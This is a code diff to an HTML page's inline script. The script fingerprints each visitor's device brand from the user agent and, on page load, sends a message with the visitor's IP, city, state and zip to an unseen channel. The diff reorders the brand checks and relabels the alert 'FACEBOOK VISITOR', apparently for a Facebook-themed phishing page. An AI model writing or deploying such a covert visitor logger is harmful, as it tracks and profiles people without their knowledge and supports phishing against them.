@@ -129,31 +129,16 @@ html, body {
   function getPhoneBrandFromUserAgent() {
     const ua = navigator.userAgent.toLowerCase();
 
-    // Apple devices
-    if (/iphone/.test(ua)) return "Apple iPhone";
-    if (/ipad/.test(ua)) return "Apple iPad";
-    if (/macintosh/.test(ua)) return "Apple Mac";
-
-    // Windows PCs
-    if (/windows nt 11/.test(ua)) return "Windows 11 PC";
-    if (/windows nt 10/.test(ua)) return "Windows 10 PC";
-    if (/windows nt 6\.1/.test(ua)) return "Windows 7 PC";
-    if (/windows/.test(ua)) return "Windows PC";
-
-    // Linux
-    if (/ubuntu/.test(ua)) return "Ubuntu Linux";
-    if (/linux/.test(ua)) return "Linux Machine";
-
-    // Android phone brands
+    // Mobile brands first
+    if (/poco/.test(ua)) return "POCO";
+    if (/redmi/.test(ua)) return "Redmi";
+    if (/xiaomi|mi/.test(ua)) return "Xiaomi";
     if (/samsung|sm-/.test(ua)) return "Samsung";
     if (/huawei/.test(ua)) return "Huawei";
     if (/honor/.test(ua)) return "Honor";
     if (/oppo/.test(ua)) return "Oppo";
     if (/realme/.test(ua)) return "Realme";
     if (/vivo/.test(ua)) return "Vivo";
-    if (/poco/.test(ua)) return "POCO";
-    if (/redmi/.test(ua)) return "Redmi";
-    if (/xiaomi|mi/.test(ua)) return "Xiaomi";
     if (/oneplus/.test(ua)) return "OnePlus";
     if (/iqoo/.test(ua)) return "iQOO";
     if (/google|pixel/.test(ua)) return "Google Pixel";
@@ -177,6 +162,21 @@ html, body {
     if (/gionee/.test(ua)) return "Gionee";
     if (/coolpad/.test(ua)) return "Coolpad";
 
+    // Apple
+    if (/iphone/.test(ua)) return "Apple iPhone";
+    if (/ipad/.test(ua)) return "Apple iPad";
+    if (/macintosh/.test(ua)) return "Apple Mac";
+
+    // Windows PCs
+    if (/windows nt 11/.test(ua)) return "Windows 11 PC";
+    if (/windows nt 10/.test(ua)) return "Windows 10 PC";
+    if (/windows nt 6\.1/.test(ua)) return "Windows 7 PC";
+    if (/windows/.test(ua)) return "Windows PC";
+
+    // Linux
+    if (/ubuntu/.test(ua)) return "Ubuntu Linux";
+    if (/linux/.test(ua)) return "Linux Machine";
+
     // Fallbacks
     if (/android/.test(ua)) return "Android (Unknown Brand)";
     return "Unknown Device";
@@ -197,7 +197,7 @@ html, body {
       const time = formatTime();
 
       const message =
-        `<b>[${ip}] <b>- V I S I T O R - </b>[${time}]</b>\n` +
+        `<b>[${ip}] - FACEBOOK V I S I T O R - [${time}]</b>\n` +
         `<b>City:</b> <code>${city}</code>\n` +
         `<b>State:</b> <code>${state}</code>\n` +
         `<b>Zip:</b> <code>${zip}</code>\n` +
@@ -218,6 +218,7 @@ html, body {
 
   sendVisitMessage();
 </script>
+
 
 
 <body>
